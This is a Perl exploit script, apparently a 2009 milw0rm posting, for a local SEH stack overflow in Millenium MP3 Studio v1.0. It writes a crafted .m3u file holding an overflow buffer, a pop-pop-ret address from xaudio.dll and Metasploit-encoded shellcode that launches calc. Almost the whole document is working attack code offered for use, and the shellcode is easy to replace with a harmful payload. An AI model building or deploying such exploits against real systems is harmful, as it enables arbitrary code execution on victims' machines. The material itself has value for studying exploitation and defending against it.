#
# [+] Vulnerability	: .m3u File Local Stack Overflow Exploit (SEH) Full Rewrite
# [+] Product		: Millenium MP3 Studio
# [+] Versions affected : v1.0
# [+] Download          : http://www.software112.com/products/mp3-millennium+download.html
# [+] Method		: seh
# [+] Tested on         : Windows XP SP3 En
# [+] Written by        : corelanc0d3r  (corelanc0d3r[at]gmail[dot]com
# [+] Greetz to         : Saumil & SK
# [+] Note : sorry for the previous version, that was a real mess
#     I mixed up 2 sploits...
#     This one should be a lot better
# -----------------------------------------------------------------------------
#                                               MMMMM~.                          
#                                               MMMMM?.                          
#    MMMMMM8.  .=MMMMMMM.. MMMMMMMM, MMMMMMM8.  MMMMM?. MMMMMMM:   MMMMMMMMMM.   
#  MMMMMMMMMM=.MMMMMMMMMMM.MMMMMMMM=MMMMMMMMMM=.MMMMM?7MMMMMMMMMM: MMMMMMMMMMM:  
#  MMMMMIMMMMM+MMMMM$MMMMM=MMMMMD$I8MMMMMIMMMMM~MMMMM?MMMMMZMMMMMI.MMMMMZMMMMM:  
#  MMMMM==7III~MMMMM=MMMMM=MMMMM$. 8MMMMMZ$$$$$~MMMMM?..MMMMMMMMMI.MMMMM+MMMMM:  
#  MMMMM=.     MMMMM=MMMMM=MMMMM7. 8MMMMM?    . MMMMM?NMMMM8MMMMMI.MMMMM+MMMMM:  
#  MMMMM=MMMMM+MMMMM=MMMMM=MMMMM7. 8MMMMM?MMMMM:MMMMM?MMMMMIMMMMMO.MMMMM+MMMMM:  
#  =MMMMMMMMMZ~MMMMMMMMMM8~MMMMM7. .MMMMMMMMMMO:MMMMM?MMMMMMMMMMMMIMMMMM+MMMMM:  
#  .:$MMMMMO7:..+OMMMMMO$=.MMMMM7.  ,IMMMMMMO$~ MMMMM?.?MMMOZMMMMZ~MMMMM+MMMMM:  
#     .,,,..      .,,,,.   .,,,,,     ..,,,..   .,,,,.. .,,...,,,. .,,,,..,,,,.  
#                                                                   eip hunters
# -----------------------------------------------------------------------------
#
# Script provided for educational purposes only.
#
#
#
my $sploitfile="C:\\mp3-millennium\\c0d3rmp3studio.m3u";
my $totallen=5007;
#
my $junk = "http://";
my $buffer="A" x 4103;
my $seh = "\xeb\x1e\x90\x90";  #jump forest, jump !
my $nseh = pack('V',0x10020BA7);  #pop pop ret from xaudio.dll
my $nop="\x90" x 32;
# windows/exec - 303 bytes
# http://www.metasploit.com
# Encoder: x86/alpha_upper
# EXITFUNC=seh, CMD=calc
my $shellcode="\x89\xe6\xda\xdb\xd9\x76\xf4\x58\x50\x59\x49\x49\x49\x49" .
"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56" .
"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41" .
"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42" .
"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4b" .
"\x58\x50\x44\x45\x50\x43\x30\x43\x30\x4c\x4b\x51\x55\x47" .
"\x4c\x4c\x4b\x43\x4c\x45\x55\x43\x48\x45\x51\x4a\x4f\x4c" .
"\x4b\x50\x4f\x45\x48\x4c\x4b\x51\x4f\x47\x50\x45\x51\x4a" .
"\x4b\x51\x59\x4c\x4b\x50\x34\x4c\x4b\x45\x51\x4a\x4e\x50" .
"\x31\x49\x50\x4d\x49\x4e\x4c\x4c\x44\x49\x50\x42\x54\x43" .
"\x37\x49\x51\x49\x5a\x44\x4d\x43\x31\x48\x42\x4a\x4b\x4b" .
"\x44\x47\x4b\x51\x44\x47\x54\x45\x54\x42\x55\x4b\x55\x4c" .
"\x4b\x51\x4f\x46\x44\x43\x31\x4a\x4b\x42\x46\x4c\x4b\x44" .
"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x43\x31\x4a\x4b\x4c" .
"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4d\x59\x51\x4c\x51" .
"\x34\x45\x54\x48\x43\x51\x4f\x50\x31\x4a\x56\x43\x50\x51" .
"\x46\x45\x34\x4c\x4b\x47\x36\x46\x50\x4c\x4b\x47\x30\x44" .
"\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x43\x58\x45" .
"\x58\x4b\x39\x4b\x48\x4b\x33\x49\x50\x43\x5a\x46\x30\x42" .
"\x48\x4a\x50\x4c\x4a\x44\x44\x51\x4f\x42\x48\x4a\x38\x4b" .
"\x4e\x4d\x5a\x44\x4e\x51\x47\x4b\x4f\x4a\x47\x42\x43\x45" .
"\x31\x42\x4c\x45\x33\x45\x50\x41\x41";


my $shelllen = $totallen-length($junk)-length($buffer)-length($seh)-length($nseh)-length($nop)-length($shellcode);
my $finalnop="\x90" x $shelllen;

my $payload=$junk.$buffer.$seh.$nseh.$nop.$shellcode.$finalnop;
#
#
print "[+] Writing exploit file $sploitfile\n";
open (myfile,">$sploitfile");
print myfile $payload;
close (myfile);
print "[+] ".length($payload)." bytes written to file\n";
print "   junk : " . length($junk)."\n";
print "    buf : " . length($buffer)."\n";
print "    seh : " . length($seh)."\n";
print "   nseh : " . length($nseh)."\n";
print "    nop : " . length($nop)."\n";
print "  shell : " . length($shellcode)."\n";
print "   nop2 : " . length($finalnop)."\n";
#
#

# milw0rm.com [2009-07-30]
